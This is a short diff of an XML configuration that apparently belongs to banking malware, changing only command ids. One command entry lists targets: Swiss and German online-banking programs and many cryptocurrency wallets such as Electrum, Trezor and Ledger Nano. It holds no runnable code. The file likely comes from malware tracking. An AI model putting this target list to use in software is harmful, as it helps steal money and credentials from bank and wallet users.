@@ -33,10 +33,10 @@
     </module>
   </modules>
   <commands>
-    <cmd id="775829" type="15">
+    <cmd id="746418" type="15">
       <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
     </cmd>
-    <cmd id="775831" type="22">
+    <cmd id="746420" type="22">
       <fs/>
     </cmd>
   </commands>
